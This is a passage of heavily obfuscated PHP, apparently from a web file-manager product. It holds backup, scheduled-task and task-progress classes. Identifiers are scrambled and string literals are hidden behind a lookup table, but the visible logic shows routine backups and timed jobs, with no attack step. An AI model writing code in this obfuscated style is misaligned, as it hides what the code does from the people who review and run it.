return $“¦°¨øé; $–Û¾“ë = $ÙÏÇİ¿[831]; if (strlen($–Û¾“ë) < $ÙÏÇİ¿[690]) { die; } } public function npjfa2984eb3($ø›™« Ö, $ÒÍµ˜Ù) { $®Å«ó‹ï =& $_SERVER[ôİ”í„Æ]; return call_user_func(array($®Å«ó‹ï[8], $®Å«ó‹ï[310]), $ø›™« Ö, $ÒÍµ˜Ù); $Ô¡û©Ä¤ = $_SERVER[¯‘·½][716]; } public function giyl19b4c071($â„„õ², $û½í·œß) { $Å½Á†Œ» =& $_SERVER[ôİ”í„Æ]; return call_user_func(array($Å½Á†Œ»[311], $Å½Á†Œ»[312]), $â„„õ², $û½í·œß); $ôıÚ·¬¶ = $_SERVER[¯‘·½][832]; } public function fxwy13863597($©ŸåäË, $¨æùç³æ) { $¦ã€£º´ =& $_SERVER[ôİ”í„Æ]; return call_user_func(array($¦ã€£º´[311], $¦ã€£º´[313]), $©ŸåäË, $¨æùç³æ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¯‘·½][833]); $this->init(); $this->keep(); } public function init() { $Ñ•™˜ã¡ =& $_SERVER[¯‘·½]; $this->isManual(); self::$name = date($Ñ•™˜ã¡[834]); if (!($ˆÚ¨ßêı = $this->model->lastItem())) { $ˆÚ¨ßêı = $this->initData(); } else { self::$name = $ˆÚ¨ßêı[$Ñ•™˜ã¡[32]]; if ($ˆÚ¨ßêı[$Ñ•™˜ã¡[835]] == $Ñ•™˜ã¡[91]) { self::$name = date($Ñ•™˜ã¡[262]); $ ‘©ß ’ = intval(_get($ˆÚ¨ßêı, $Ñ•™˜ã¡[836], 0)); if (self::$manual == 0 && $ˆÚ¨ßêı[$Ñ•™˜ã¡[32]] == self::$name) { $this->model->remove($ˆÚ¨ßêı[$Ñ•™˜ã¡[477]]); } $ˆÚ¨ßêı = $this->initData($ ‘©ß ’, $ˆÚ¨ßêı[$Ñ•™˜ã¡[837]]); } else { $this->checkStore($ˆÚ¨ßêı[$Ñ•™˜ã¡[837]]); } } self::$option = $ˆÚ¨ßêı; } private function isManual() { $Ô¦…‹×¥ = _get($GLOBALS, $_SERVER[¯‘·½][838], 0); $Ô¦…‹×¥ = intval($Ô¦…‹×¥); self::$manual = $Ô¦…‹×¥ && $Ô¦…‹×¥ == 1 ? 1 : 0; } private function initData($¥©à»¿¥ = 0, $–´‚µù“ = '') { $ÑÇ¡•·İ =& $_SERVER[¯‘·½]; $Ş­§Ù¥ï = $this->model->config(); if ($–´‚µù“ && $Ş­§Ù¥ï[$ÑÇ¡•·İ[837]] != $–´‚µù“) { $¥©à»¿¥ = 0; } $this->checkStore($Ş­§Ù¥ï[$ÑÇ¡•·İ[837]]); if (self::$manual == 1) { self::$name .= $ÑÇ¡•·İ[11] . date($ÑÇ¡•·İ[839]); } $ò÷ğ¥›¢ = array($ÑÇ¡•·İ[837] => $Ş­§Ù¥ï[$ÑÇ¡•·İ[837]], $ÑÇ¡•·İ[32] => self::$name, $ÑÇ¡•·İ[835] => 0, $ÑÇ¡•·İ[171] => $Ş­§Ù¥ï[$ÑÇ¡•·İ[171]], $ÑÇ¡•·İ[840] => self::$manual, $ÑÇ¡•·İ[841] => array($ÑÇ¡•·İ[842] => array($ÑÇ¡•·İ[835] => 0), $ÑÇ¡•·İ[843] => array($ÑÇ¡•·İ[835] => 0, $ÑÇ¡•·İ[844] => 0, $ÑÇ¡•·İ[845] => 0, $ÑÇ¡•·İ[33] => $ÑÇ¡•·İ[12], $ÑÇ¡•·İ[846] => 0, $ÑÇ¡•·İ[847] => 0), $ÑÇ¡•·İ[848] => array($ÑÇ¡•·İ[835] => 0, $ÑÇ¡•·İ[844] => 0, $ÑÇ¡•·İ[845] => 0, $ÑÇ¡•·İ[846] => 0, $ÑÇ¡•·İ[847] => 0), $ÑÇ¡•·İ[233] => array($ÑÇ¡•·İ[835] => 0, $ÑÇ¡•·İ[849] => 0, $ÑÇ¡•·İ[850] => 0, $ÑÇ¡•·İ[851] => 0, $ÑÇ¡•·İ[852] => 0, $ÑÇ¡•·İ[545] => $¥©à»¿¥, $ÑÇ¡•·İ[846] => 0, $ÑÇ¡•·İ[847] => 0)), $ÑÇ¡•·İ[846] => time(), $ÑÇ¡•·İ[847] => 0); $îş¸»Í¹ = $this->model->insert($ò÷ğ¥›¢); $ò÷ğ¥›¢[$ÑÇ¡•·İ[477]] = $îş¸»Í¹; return $ò÷ğ¥›¢; } private function checkStore($æ¹öë¾„) { $„«Òâ³“ = Model($_SERVER[¯‘·½][853]); $’ÈŒİ = $„«Òâ³“->listData($æ¹öë¾„); $„«Òâ³“->checkConfig($’ÈŒİ); } public static function get() { if (!self::$option) { $ÛÄÈê½Ä = Model($_SERVER[¯‘·½][833]); $÷½ÍèÒ± = $ÛÄÈê½Ä->findByName(self::$name); $ÛÄÈê½Ä->parseContent($÷½ÍèÒ±); self::$option = $÷½ÍèÒ±; } return self::$option; } public static function set($ú²’ºÏ) { $‹¡Ú³íÖ =& $_SERVER[¯‘·½]; $ÒÆÂ» ­ = self::get(); foreach ($ú²’ºÏ as $–½à˜«Ä => $¾Ìè§š) { array_set_value($ÒÆÂ» ­, $–½à˜«Ä, $¾Ìè§š); } Model($‹¡Ú³íÖ[833])->update($ÒÆÂ» ­[$‹¡Ú³íÖ[477]], $ÒÆÂ» ­); self::$option = $ÒÆÂ» ­; return self::$option; } public function keep() { $ã»¦×ì¿ =& $_SERVER[¯‘·½]; $ÄÌ”¤°… = self::get(); if (_get($ÄÌ”¤°…, $ã»¦×ì¿[854], 0) == $ã»¦×ì¿[91]) { return; } $this->backupKeep($ÄÌ”¤°…); self::set(array($ã»¦×ì¿[854] => 1)); } private function backupKeep($²«Ÿ¾ªô) { $Éé×Œ¨Ô =& $_SERVER[¯‘·½]; if (self::$manual == 1) { return; } $šáİÙÖ° = $this->model->listData(); if (empty($šáİÙÖ°)) { return; } $÷®õô¢û = 0; $Ç—¹”Ò› = array(); foreach ($šáİÙÖ° as $’úØûßâ) { if ($÷®õô¢û >= 7) { break; } $Ç—¹”Ò›[] = $’úØûßâ[$Éé×Œ¨Ô[32]]; $÷®õô¢û++; } for ($÷®õô¢û = 0; $÷®õô¢û < 12; $÷®õô¢û++) { $Ç—¹”Ò›[] = date($Éé×Œ¨Ô[855], strtotime("\x2d{$÷®õô¢û}\40\155\157\156\164\150\x73")); } $Ç—¹”Ò› = array_unique($Ç—¹”Ò›); $Ş¿¹‰Í• = Model($Éé×Œ¨Ô[856])->get($Éé×Œ¨Ô[857]); foreach ($šáİÙÖ° as $’úØûßâ) { if (isset($’úØûßâ[$Éé×Œ¨Ô[840]]) && $’úØûßâ[$Éé×Œ¨Ô[840]] == $Éé×Œ¨Ô[91]) { continue; } if (!empty($’úØûßâ[$Éé×Œ¨Ô[32]]) && in_array($’úØûßâ[$Éé×Œ¨Ô[32]], $Ç—¹”Ò›)) { continue; } $this->model->remove($’úØûßâ[$Éé×Œ¨Ô[477]]); $“ıÁ”œ = $this->backupPath($²«Ÿ¾ªô, $Ş¿¹‰Í•); IO::remove($“ıÁ”œ, !1); } } private function backupPath($£ƒŸÅÂÔ, $Û§òÁ‰ñ = false) { $ŠªÒ ï¾ =& $_SERVER[¯‘·½]; if (!$Û§òÁ‰ñ) { $Û§òÁ‰ñ = Model($ŠªÒ ï¾[856])->get($ŠªÒ ï¾[857]); } $ÉŸ£¸ó = $£ƒŸÅÂÔ[$ŠªÒ ï¾[32]]; $Ã†ñç¥„ = substr(md5($ŠªÒ ï¾[858] . $Û§òÁ‰ñ . $ÉŸ£¸ó), 0, 8); return "\x7b\151\x6f\72{$£ƒŸÅÂÔ[$ŠªÒ ï¾[837]]}\175\x2f\x64\x61\x74\141\142\141\x73\x65\x2f\x62\x61\143\x6b\165\160\x2f" . $ÉŸ£¸ó . $ŠªÒ ï¾[11] . $Ã†ñç¥„; } public function db() { $§¸áØÅ =& $_SERVER[¯‘·½]; $ò§ì…º£ = self::get(); if (_get($ò§ì…º£, $§¸áØÅ[859], 0) == $§¸áØÅ[91]) { return !0; } $ŒğŸ–“µ = new BackupDb(); if (!$ŒğŸ–“µ->index()) { return !1; } self::set(array($§¸áØÅ[859] => 1)); return !0; } public function dbFile() { $†å¶ºïú =& $_SERVER[¯‘·½]; $Ùµ›–´± = self::get(); if (_get($Ùµ›–´±, $†å¶ºïú[860], 0) == $†å¶ºïú[91]) { return !0; } $‚õ‰ìÛ = new BackupDbFile(); if (!$‚õ‰ìÛ->index()) { return !1; } self::set(array($†å¶ºïú[860] => 1)); return !0; } public function file() { $º©Ş…Ú =& $_SERVER[¯‘·½]; $åÕŞ± = self::get(); if (_get($åÕŞ±, $º©Ş…Ú[861], 0) == $º©Ş…Ú[91]) { return !0; } if ($åÕŞ±[$º©Ş…Ú[171]] == $º©Ş…Ú[862]) { $èê¬€ãà = new BackupFile(); if (!$èê¬€ãà->index()) { return !1; } } self::set(array($º©Ş…Ú[861] => 1, $º©Ş…Ú[835] => 1)); return !0; } public static function log($àÄù¾¬É) { write_log($àÄù¾¬É, $_SERVER[¯‘·½][863]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $‡õìÃá¹ =& $_SERVER[¯‘·½]; $¯ŒË¸€ò = Backup::get(); self::$io = $¯ŒË¸€ò[$‡õìÃá¹[837]]; self::$name = $¯ŒË¸€ò[$‡õìÃá¹[32]]; $‡ãå§ıŒ = new DbManage(); $Î¾ªıôÍ = $‡ãå§ıŒ->dbType(); $ñÇèê  = array($‡õìÃá¹[864] => $Î¾ªıôÍ, $‡õìÃá¹[865] => time()); Backup::set($ñÇèê ); $†–ÏÈ¨ = $this->tmpFilesPath() . $‡õìÃá¹[866] . self::$name . $‡õìÃá¹[8]; del_dir($†–ÏÈ¨); mk_dir($†–ÏÈ¨); $·ŒŞÖ’Ê = $ƒ³“Ê”ı = 0; try { $˜ÅšÜ© = $‡ãå§ıŒ->db()->getTables(); } catch (Exception $Ç£Ù¨½À) { Backup::log($‡õìÃá¹[867] . $Ç£Ù¨½À->getMessage()); return !1; } $˜ÅšÜ© = array_diff($˜ÅšÜ©, array($‡õìÃá¹[868], $‡õìÃá¹[869])); foreach ($˜ÅšÜ© as $–Æƒ×•Ó) { if ($–Æƒ×•Ó == $‡õìÃá¹[870]) { continue; } $·ŒŞÖ’Ê += $‡ãå§ıŒ->model($–Æƒ×•Ó)->count(); } $’©Ë²ÔÌ = new Task($‡õìÃá¹[871], $‡õìÃá¹[863], $·ŒŞÖ’Ê, LNG($‡õìÃá¹[872]) . $‡õìÃá¹[873] . LNG($‡õìÃá¹[874])); $GLOBALS[$‡õìÃá¹[875]] = self::$name; foreach ($˜ÅšÜ© as $–Æƒ×•Ó) { $ëë“ºÃ— = $†–ÏÈ¨ . $–Æƒ×•Ó . $‡õìÃá¹[876]; if ($–Æƒ×•Ó == $‡õìÃá¹[870]) { @touch($ëë“ºÃ—); continue; } $ó¹İıÇš = null; if ($–Æƒ×•Ó == $‡õìÃá¹[877] && $¯ŒË¸€ò[$‡õìÃá¹[171]] == $‡õìÃá¹[862]) { $ó¹İıÇš = self::$io; } $ƒ³“Ê”ı += $‡ãå§ıŒ->sqlFromDb($–Æƒ×•Ó, $ëë“ºÃ—, $’©Ë²ÔÌ, $ó¹İıÇš); } unset($GLOBALS[$‡õìÃá¹[875]]); $’©Ë²ÔÌ->end(); if ($ƒ³“Ê”ı > $·ŒŞÖ’Ê) { $·ŒŞÖ’Ê = $ƒ³“Ê”ı; } $ñÇèê  = array($‡õìÃá¹[864] => $Î¾ªıôÍ, $‡õìÃá¹[859] => 1, $‡õìÃá¹[878] => $·ŒŞÖ’Ê, $‡õìÃá¹[879] => $ƒ³“Ê”ı, $‡õìÃá¹[880] => time()); Backup::set($ñÇèê ); if ($·ŒŞÖ’Ê - $ƒ³“Ê”ı > 0) { $ãÈÜÃçô = $‡õìÃá¹[881]; if (!stristr(I18n::getType(), $‡õìÃá¹[882])) { $ãÈÜÃçô = $‡õìÃá¹[883]; } Backup::log(array($ãÈÜÃçô, $ñÇèê )); return !1; } return !0; } private function tmpFilesPath() { $éÈ›€ûÒ =& $_SERVER[¯‘·½]; $™¼ıÕõ = TEMP_FILES; if ($GLOBALS[$éÈ›€ûÒ[6]][$éÈ›€ûÒ[92]][$éÈ›€ûÒ[884]]) { $™¼ıÕõ = $GLOBALS[$éÈ›€ûÒ[6]][$éÈ›€ûÒ[92]][$éÈ›€ûÒ[884]]; if (!mk_dir($™¼ıÕõ) || !is_writable($™¼ıÕõ) || !IO::mkfile($™¼ıÕõ . $éÈ›€ûÒ[885])) { $™¼ıÕõ = TEMP_FILES; } } return $™¼ıÕõ; } } goto Eª¼ƒÈÈĞï; aò–£¯×”: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $®ˆƒéŒô =& $_SERVER[¯‘·½]; if (self::valueGet($®ˆƒéŒô[835]) != $®ˆƒéŒô[91]) { return; } if (self::valueGet($®ˆƒéŒô[1755]) == $®ˆƒéŒô[91]) { $ıûÃÑÛ = self::valueGet($®ˆƒéŒô[1756]); if (time() - $ıûÃÑÛ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($®ˆƒéŒô[1755], $®ˆƒéŒô[91]); self::log($®ˆƒéŒô[1757] . ACTION . $®ˆƒéŒô[1758]); Hook::bind($®ˆƒéŒô[1759], $®ˆƒéŒô[1760]); $ÕÒĞ¯Úğ = 0; while (!0) { self::cacheClear(); if (self::valueGet($®ˆƒéŒô[835]) != $®ˆƒéŒô[91]) { self::valueSet($®ˆƒéŒô[1755], $®ˆƒéŒô[231]); self::log($®ˆƒéŒô[1761]); die; } $Ü‡ó’ºó = time(); if ($Ü‡ó’ºó - $ÕÒĞ¯Úğ >= 60) { self::valueSet(array($®ˆƒéŒô[1755] => $®ˆƒéŒô[91], $®ˆƒéŒô[1756] => $Ü‡ó’ºó)); $ÕÒĞ¯Úğ = $Ü‡ó’ºó; } if (!file_exists(USER_SYSTEM . $®ˆƒéŒô[1762])) { self::valueSet(array($®ˆƒéŒô[1755] => $®ˆƒéŒô[231], $®ˆƒéŒô[835] => $®ˆƒéŒô[231])); self::log($®ˆƒéŒô[1763]); die; } $ì—¥ = file_get_contents(BASIC_PATH . $®ˆƒéŒô[1764]); $É÷‚¦‚’ = KOD_VERSION . $®ˆƒéŒô[10] . KOD_VERSION_BUILD; $ıû„Ï€« = match_text($ì—¥, $®ˆƒéŒô[1765]) . $®ˆƒéŒô[10] . match_text($ì—¥, $®ˆƒéŒô[1766]); if ($ıû„Ï€« != $É÷‚¦‚’) { self::restart(); self::log("\x73\164\x6f\160\145\x64\x2e\x5b\166\x65\162\x73\151\157\x6e\x20\165\160\144\x61\164\x65\73{$versionNow}\x20\75\76\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $äÛÃ—£Ï =& $_SERVER[¯‘·½]; http_close(); $GLOBALS[$äÛÃ—£Ï[1767]] = 1; $_SERVER[$äÛÃ—£Ï[1768]] = $äÛÃ—£Ï[1769]; $_COOKIE = array(); $GLOBALS[$äÛÃ—£Ï[1770]] = 1; $GLOBALS[$äÛÃ—£Ï[1771]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $óÄ¢÷¶ =& $_SERVER[¯‘·½]; http_close(); self::valueSet($óÄ¢÷¶[835], $óÄ¢÷¶[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($óÄ¢÷¶[1755] => $óÄ¢÷¶[231], $óÄ¢÷¶[835] => $óÄ¢÷¶[91])); self::log($óÄ¢÷¶[1772]); } public static function taskSwitch() { $ñêŸôƒÙ =& $_SERVER[¯‘·½]; $Ûª™¿¥¦ = self::valueGet($ñêŸôƒÙ[835]) == $ñêŸôƒÙ[91] ? $ñêŸôƒÙ[231] : $ñêŸôƒÙ[91]; self::valueSet($ñêŸôƒÙ[835], $Ûª™¿¥¦); } public static function shutdownEvent() { $ğ†Á¸³ =& $_SERVER[¯‘·½]; self::valueSet($ğ†Á¸³[1755], $ğ†Á¸³[231]); self::log($ğ†Á¸³[1773]); } public static function config($¼™’Ú´ø, $³´¼ç¨›) { self::valueSet($_SERVER[¯‘·½][835], $¼™’Ú´ø); } private static function taskRunAll() { $­Î”ÄÜ =& $_SERVER[¯‘·½]; $Ä¡¿øĞĞ = timeFloat(); $’ˆá…‹† = Model($­Î”ÄÜ[1774])->listData(); $´ÂËÚ¡÷ = count($’ˆá…‹†); for ($Î¦ŞÀ©ñ = 0; $Î¦ŞÀ©ñ < $´ÂËÚ¡÷; $Î¦ŞÀ©ñ++) { $³Ÿ¶ˆ¤‘ = $’ˆá…‹†[$Î¦ŞÀ©ñ]; if (!$³Ÿ¶ˆ¤‘[$­Î”ÄÜ[477]] || $³Ÿ¶ˆ¤‘[$­Î”ÄÜ[1775]] != $­Î”ÄÜ[91]) { continue; } if (!self::taskTimeCheck($³Ÿ¶ˆ¤‘)) { continue; } self::taskRun($³Ÿ¶ˆ¤‘); } Hook::trigger($­Î”ÄÜ[1776]); self::taskQueueRun($Ä¡¿øĞĞ); } private static function taskQueueRun($ÀŸŞ²Ê±) { $ÕÍó Ó = 10; while (!0) { $á–ŞÇ¶¯ = TaskQueue::run(); if ($á–ŞÇ¶¯ === !1) { break; } if (timeFloat() - $ÀŸŞ²Ê± >= $ÕÍó Ó) { break; } } } private static function taskTimeCheck($ê®Ü©©ş) { $Ó†‡«Á =& $_SERVER[¯‘·½]; $ÍÆœ¿¡à = json_decode($ê®Ü©©ş[$Ó†‡«Á[207]], !0); $Æ¬ëÂÒ¶ = intval($ê®Ü©©ş[$Ó†‡«Á[1756]]); $åä–¤ìÂ = strtotime($Ó†‡«Á[1777] . $ÍÆœ¿¡à[$Ó†‡«Á[1778]] . $Ó†‡«Á[1779]) - strtotime($Ó†‡«Á[1780]); $Ş…â“ÔÊ = time() - strtotime(date($Ó†‡«Á[1781]) . $Ó†‡«Á[1782]); $»šÉÛèó = $Ş…â“ÔÊ >= $åä–¤ìÂ && $Ş…â“ÔÊ <= $åä–¤ìÂ + 3600; switch ($ÍÆœ¿¡à[$Ó†‡«Á[33]]) { case $Ó†‡«Á[1783]: if (time() - $Æ¬ëÂÒ¶ < 3600 * 24 * 30) { return !1; } if ($ÍÆœ¿¡à[$Ó†‡«Á[1783]] == date($Ó†‡«Á[1784]) && $»šÉÛèó) { return !0; } break; case $Ó†‡«Á[1785]: if (time() - $Æ¬ëÂÒ¶ < 3600 * 24 * 7) { return !1; } $øÁã¼®Ù = date($Ó†‡«Á[1786]) == 0 ? 7 : date($Ó†‡«Á[1786]); if ($ÍÆœ¿¡à[$Ó†‡«Á[1785]] == $øÁã¼®Ù && $»šÉÛèó) { return !0; } break; case $Ó†‡«Á[1778]: if (time() - $Æ¬ëÂÒ¶ < 3600 * 24) { return !1; } if ($»šÉÛèó) { return !0; } break; case $Ó†‡«Á[1787]: if (time() - $Æ¬ëÂÒ¶ >= floatval($ÍÆœ¿¡à[$Ó†‡«Á[1787]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $õ¾Ûäãá =& $_SERVER[¯‘·½]; static $´³ì†íà = 0; $Íº¸û¸ú = 300; if (!$´³ì†íà) { $´³ì†íà = time(); } if (time() - $´³ì†íà < $Íº¸û¸ú) { return; } $´³ì†íà = time(); $úÑÁ¬ƒµ = Model($õ¾Ûäãá[581])->db($õ¾Ûäãá[12]); if ($úÑÁ¬ƒµ) { $úÑÁ¬ƒµ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($õ¾Ûäãá[1788], $õ¾Ûäãá[1789]); die; } } public static function taskRun($ç³‰Á©ƒ) { $ÅËë¢ˆà =& $_SERVER[¯‘·½]; self::log($ÅËë¢ˆà[1790] . $ç³‰Á©ƒ[$ÅËë¢ˆà[477]] . $ÅËë¢ˆà[1791] . $ç³‰Á©ƒ[$ÅËë¢ˆà[32]] . $ÅËë¢ˆà[1792] . $ç³‰Á©ƒ[$ÅËë¢ˆà[1793]]); Model($ÅËë¢ˆà[1774])->run($ç³‰Á©ƒ[$ÅËë¢ˆà[477]]); $¥Öåş²É = timeFloat(); $ñÄÊ¶–ù = $ÅËë¢ˆà[12]; switch ($ç³‰Á©ƒ[$ÅËë¢ˆà[33]]) { case $ÅËë¢ˆà[384]: $ô±ƒ = url_request($ç³‰Á©ƒ[$ÅËë¢ˆà[1793]], $ÅËë¢ˆà[1527], !1, !1, !1, !1, 10); if ($ô±ƒ[$ÅËë¢ˆà[835]]) { $ñÄÊ¶–ù = strlen($ô±ƒ[$ÅËë¢ˆà[1311]]); } break; case $ÅËë¢ˆà[1794]: $ñÄÊ¶–ù = Hook::apply($ç³‰Á©ƒ[$ÅËë¢ˆà[1793]]); default: break; } Model($ÅËë¢ˆà[1795])->add(array($ÅËë¢ˆà[1796] => $ÅËë¢ˆà[12], $ÅËë¢ˆà[1797] => $ÅËë¢ˆà[231], $ÅËë¢ˆà[33] => $ÅËë¢ˆà[1798] . $ç³‰Á©ƒ[$ÅËë¢ˆà[477]], $ÅËë¢ˆà[1799] => json_encode(array($ÅËë¢ˆà[32] => $ç³‰Á©ƒ[$ÅËë¢ˆà[32]], $ÅËë¢ˆà[1800] => timeFloat() - $¥Öåş²É, $ÅËë¢ˆà[841] => $ñÄÊ¶–ù)))); $³¼áêÚÏ = $ñÄÊ¶–ù ? $ÅËë¢ˆà[1801] . $ñÄÊ¶–ù : $ÅËë¢ˆà[12]; self::log($ÅËë¢ˆà[1802] . $ç³‰Á©ƒ[$ÅËë¢ˆà[477]] . $ÅËë¢ˆà[178] . $³¼áêÚÏ); return !0; } public static function valueGet($íº¥Üñí) { $é¬—¡İ =& $_SERVER[¯‘·½]; $À¾ÈÜÛ” = $é¬—¡İ[1803]; $ú¬›€ú— = Model($é¬—¡İ[510])->get($íº¥Üñí, $À¾ÈÜÛ”); if (is_null($ú¬›€ú—)) { Model($é¬—¡İ[510])->set($é¬—¡İ[835], $é¬—¡İ[91], $À¾ÈÜÛ”); Model($é¬—¡İ[510])->set($é¬—¡İ[1755], $é¬—¡İ[231], $À¾ÈÜÛ”); $ú¬›€ú— = Model($é¬—¡İ[510])->get($íº¥Üñí, $À¾ÈÜÛ”); } return $ú¬›€ú—; } private static function valueSet($ğïÏ®”, $Êå¿ËŞÉ = false) { $¢Öâ€¿« =& $_SERVER[¯‘·½]; $ŸÇ”‚•œ = $¢Öâ€¿«[1804]; CacheLock::lock($ŸÇ”‚•œ); $á¡Ù¸„ = Model($¢Öâ€¿«[510])->set($ğïÏ®”, $Êå¿ËŞÉ, $¢Öâ€¿«[1803]); CacheLock::unlock($ŸÇ”‚•œ); return $á¡Ù¸„; } protected static function log($­ƒíÍ±) { write_log($­ƒíÍ±, $_SERVER[¯‘·½][1789]); } private static function cacheClear() { $ØÔ¸é€Õ =& $_SERVER[¯‘·½]; Cache::clearMemory(Model($ØÔ¸é€Õ[510])->cacheKey($ØÔ¸é€Õ[1803])); Cache::clearMemory(Model($ØÔ¸é€Õ[510])->cacheKey($ØÔ¸é€Õ[1805])); Model($ØÔ¸é€Õ[1774])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\162\165\x6e\x6e\x69\156\147"; const STATYS_KILL = "\153\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($À„ä¨Ä«, $Ï¨ìâÊ = '', $©ä…˜Àü = 0, $„ó·›Ô¡ = '') { $Á®“Óä“ =& $_SERVER[¯‘·½]; if (self::get($À„ä¨Ä«)) { return; } $this->task = array($Á®“Óä“[477] => $À„ä¨Ä«, $Á®“Óä“[1806] => USER_ID, $Á®“Óä“[1693] => $„ó·›Ô¡, $Á®“Óä“[528] => $Á®“Óä“[12], $Á®“Óä“[33] => $Ï¨ìâÊ, $Á®“Óä“[1161] => $Á®“Óä“[12], $Á®“Óä“[1159] => $©ä…˜Àü, $Á®“Óä“[1807] => 0, $Á®“Óä“[1808] => 0, $Á®“Óä“[1809] => 0, $Á®“Óä“[1810] => timeFloat(), $Á®“Óä“[1811] => 0, $Á®“Óä“[1812] => 0, $Á®“Óä“[1813] => 0, $Á®“Óä“[1814] => 0, $Á®“Óä“[835] => $Á®“Óä“[1755]); $GLOBALS[$Á®“Óä“[1815]] = 1; Hook::bind($Á®“Óä“[1759], array($this, $Á®“Óä“[1816])); Hook::bind($Á®“Óä“[1817], array($this, $Á®“Óä“[1818])); $this->startAfter(); Hook::trigger($Á®“Óä“[1819], $this->task); $this->task[$Á®“Óä“[1812]] = timeFloat(); } public function end($É‘Âõæ = '') { $‹»³ Õ© =& $_SERVER[¯‘·½]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$‹»³ Õ©[1812]]) { self::valueSet($this->task[$‹»³ Õ©[477]], !1); } $this->isEnd = !0; if ($É‘Âõæ) { $this->task[$‹»³ Õ©[528]] = $É‘Âõæ; } self::log($‹»³ Õ©[1820] . $this->task[$‹»³ Õ©[477]] . $‹»³ Õ©[1821] . sprintf($‹»³ Õ©[943], timeFloat() - $this->task[$‹»³ Õ©[1810]]) . $‹»³ Õ©[1822]); Hook::unbind($‹»³ Õ©[1759], array($this, $‹»³ Õ©[1816])); Hook::unbind($‹»³ Õ©[1817], array($this, $‹»³ Õ©[1818])); $this->endAfter(); $…£ïçÌ¡ = $this->task; $this->task = !1; Hook::trigger($‹»³ Õ©[1823], $…£ïçÌ¡); } public function update($®®üĞØ· = 0, $¨Ğºü¸¦ = false) { $ñŒ›­± =& $_SERVER[¯‘·½]; $éç€²¯ =& $this->task; if (!$éç€²¯) { return; } $éç€²¯[$ñŒ›­±[1807]] += $®®üĞØ·; $éç€²¯[$ñŒ›­±[1811]] = timeFloat(); if ($éç€²¯[$ñŒ›­±[1159]]) { if ($éç€²¯[$ñŒ›­±[1159]] < $éç€²¯[$ñŒ›­±[1807]]) { $éç€²¯[$ñŒ›­±[1159]] = $éç€²¯[$ñŒ›­±[1807]]; } $ŠÖèÅ„ = timeFloat() - $éç€²¯[$ñŒ›­±[1810]] - $éç€²¯[$ñŒ›­±[1813]]; if ($ŠÖèÅ„ <= 0) { $ŠÖèÅ„ = 0.001; } $éç€²¯[$ñŒ›­±[1808]] = $éç€²¯[$ñŒ›­±[1807]] / $éç€²¯[$ñŒ›­±[1159]]; $éç€²¯[$ñŒ›­±[1809]] = $éç€²¯[$ñŒ›­±[1807]] / $ŠÖèÅ„; if ($éç€²¯[$ñŒ›­±[1808]] > 0) { $éç€²¯[$ñŒ›­±[1814]] = $ŠÖèÅ„ * (1 - $éç€²¯[$ñŒ›­±[1808]]) / $éç€²¯[$ñŒ›­±[1808]]; } $éç€²¯[$ñŒ›­±[1814]] = $éç€²¯[$ñŒ›­±[1814]] <= 0 ? 0 : $éç€²¯[$ñŒ›­±[1814]]; } $this->updateAfter(); $ßâÅïÃÊ = 0.2; if (timeFloat() - $éç€²¯[$ñŒ›­±[1812]] < $ßâÅïÃÊ && !$¨Ğºü¸¦) { return; } $„÷ßæ” = self::get($éç€²¯[$ñŒ›­±[477]]); $Âşõ’¹  = $„÷ßæ”[$ñŒ›­±[835]]; if ($Âşõ’¹  == self::STATYS_KILL) { $ÁÇ¨ÌÔ… = array($ñŒ›­±[1824] => LNG($ñŒ›­±[1825]), $ñŒ›­±[1321] => !1); Cache::set($ñŒ›­±[1826] . $this->task[$ñŒ›­±[477]], $ÁÇ¨ÌÔ…, 30); $this->onKill(); $this->end(); die; } else { if ($Âşõ’¹  == self::STATYS_STOP) { $‘ãôÈ†é = 2; $„÷ßæ”[$ñŒ›­±[1813]] += $‘ãôÈ†é; self::valueSet($éç€²¯[$ñŒ›­±[477]], $„÷ßæ”); sleep($‘ãôÈ†é); $this->update(); return; } } $éç€²¯[$ñŒ›­±[835]] = $Âşõ’¹  ? $Âşõ’¹  : $éç€²¯[$ñŒ›­±[835]]; $éç€²¯[$ñŒ›­±[1813]] = $„÷ßæ”[$ñŒ›­±[1813]] ? $„÷ßæ”[$ñŒ›­±[1813]] : 0; $éç€²¯[$ñŒ›­±[1812]] = timeFloat(); Hook::trigger($ñŒ›­±[1827], $éç€²¯); self::valueSet($éç€²¯[$ñŒ›­±[477]], $éç€²¯); } public function onKillSet($¶º¼ñóĞ, $˜ş‹øØ = array()) { $this->onKillCall = array($¶º¼ñóĞ, $˜ş‹øØ); } public function onKill() { $ñÎ è Ê =& $_SERVER[¯‘·½]; self::log($ñÎ è Ê[1820] . $this->task[$ñÎ è Ê[477]] . $ñÎ è Ê[1828]); Hook::trigger($ñÎ è Ê[1829], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÏáÆâĞ) { $¶‰’­€Ã =& $_SERVER[¯‘·½]; Cache::set($¶‰’­€Ã[1826] . $this->task[$¶‰’­€Ã[477]], $ÏáÆâĞ, 60); if (!is_array($ÏáÆâĞ) || !$ÏáÆâĞ[$¶‰’­€Ã[1321]]) { self::log($¶‰’­€Ã[1830] . json_encode($ÏáÆâĞ)); } return $ÏáÆâĞ; } public static function get($—“Ö»Èë) { $Ô…äÓ¨ =& $_SERVER[¯‘·½]; $“Ä±òø = self::valueGet($—“Ö»Èë); if (is_array($“Ä±òø) && $“Ä±òø[$Ô…äÓ¨[1831]]) { $«àêøÌ = ActionApply($“Ä±òø[$Ô…äÓ¨[1831]], array($“Ä±òø)); 